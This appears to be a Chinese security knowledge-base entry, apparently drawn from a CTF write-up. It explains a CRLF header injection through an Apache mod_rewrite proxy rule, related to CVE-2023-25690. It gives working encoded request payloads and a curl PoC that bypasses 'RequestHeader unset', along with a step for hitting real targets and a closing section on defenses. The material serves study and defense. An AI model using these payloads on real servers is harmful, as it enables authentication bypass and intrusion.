---
id: web-generic-http-smuggling-apache-rewriterule-crlf-header-injection-bypass
title: Apache mod_rewrite 代理场景 RewriteRule 目标参数 CRLF 注入：URL 编码的 %0d%0a 在转发时解码成新请求头，绕过 RequestHeader unset
type: scenario
domain: web
path: web/generic/http-smuggling
technique: apache-rewriterule-target-crlf-header-injection
tags:
- web
- apache
- httpd
- mod-rewrite
- request-smuggling
- crlf
- header-injection
cve: CVE-2023-25690
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-28
  verified_at: '2026-11-08T15:06:05+08:00'
  notes: 已对照原文核对：图07-09 证实 %0d%0a 头注入、后端日志 a:admin、Apache/2.4.55 响应头与 curl PoC；affected_versions 已清空（2.4.55 系 Dockerfile 目标环境版本，原文未写受影响区间），CVE 保留自原文引用链接
url: /docs/web/generic/http-smuggling/web-generic-http-smuggling-apache-rewriterule-crlf-header-injection-bypass/
draft: false
kb_aliases:
- mod_rewrite CRLF 注入
- RewriteRule 请求头注入
- CVE-2023-25690 同族
- Apache 代理头注入绕过
---

## 一句话结论

`RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]` 会把捕获组原样拼进转发请求的 URL，而捕获组里的 URL 编码序列（`%20`、`%0d%0a`）在 Apache 向后端发起新请求时被解码——于是 `/name/1%20HTTP/1.1%0d%0aHost:...%0d%0aa:admin%0d%0a%0d%0a` 会在后端连接上展开成完整的第二段 HTTP 请求头，使后端看到 `a: admin`，绕过前端 `RequestHeader unset a` 的头删除规则。

## 原理

- mod_rewrite 用 `[P]` 标志把匹配结果交给 mod_proxy 发起新请求；`$1` 引用的用户输入先经 URL 解码再被拼进「后端请求行 + 头部」的字节流，而不是作为参数值安全编码。
- 因此解码后的 `\r\n` 在后端视角就是合法的请求行/头分隔符：`GET /name/1 HTTP/1.1\r\nHost: ...\r\na: admin\r\n\r\n`——它变成了对后端 `/name/1` 的一次全新请求，附带了任意攻击者构造的头。
- 前端的 `RequestHeader unset a` 只作用于「进入 Apache 的那一个请求」的头集合，对 rewrite/proxy 阶段重新组装出的字节流里多出来的头无能为力；后端 Express 按标准 HTTP 解析即看到 `a: admin` 并返回 FLAG。
- 与 CVE-2023-25690 同根因：httpd 2.4.0~2.4.55 在 mod_rewrite + mod_proxy 组合下对转发请求行的解析/重组不当，可造成 HTTP 请求走私。

## 触发条件

- 前端 Apache 启用 mod_rewrite + mod_proxy（http），RewriteRule 的目标 URL 含用户可控捕获组；
- 后端信任某个请求头做鉴权，而前端用 `RequestHeader unset` 删除该头；
- 攻击者可在路径中提交 `%0d%0a` 等编码序列且未被拒绝。

## 利用步骤

1. 审计 httpd.conf：`RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]`、`RequestHeader unset A`/`unset a`，后端 `req.header('a') === 'admin'` 才返回 flag。
2. 本地复现：backend 目录放 flag.txt，`docker-compose up`。
3. 构造请求：`GET /name/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aa:%20admin%0d%0a%0d%0a HTTP/1.1`。
4. 后端日志显示收到的头为 `{host: 'localhost', a: 'admin'}`，响应体即 flag。
5. 打真实环境把 Host 换成站点域名，curl 一次完成：
   `curl "https://target/name/12%20HTTP/1.1%0d%0aHost:%20target%0d%0aa:%20admin%0d%0a%0d%0a"`。

## PoC

```bash
curl "https://wonka.chal.cyberjousting.com/name/12%20HTTP/1.1%0d%0aHost:%20wonka.chal.cyberjousting.com%0d%0aa:%20admin%0d%0a%0d%0a"
```

## 变体与关联

- 同一 CVE 的标准打法是走私两个请求（POST + CL 操纵），本题只是其「头注入」变体；
- 同族绕过：用大小写变体头、下划线/空格变体绕过 unset（`RequestHeader unset` 区分大小写时 `a` 与 `A` 各需一条）、或在 X-Forwarded-* 链路上注入。

## 检测与防御

- 升级 httpd 至 2.4.56 以上（修复 CVE-2023-25690）；
- RewriteRule 目标中避免拼接用户输入，或对捕获组强制 `escape`/仅允许白名单字符（拒绝 `%0d`、`%0a`、空格编码）；
- 鉴权不依赖单个可伪造头；前端在 proxy 阶段显式覆盖（set）而非仅 unset 关键头。
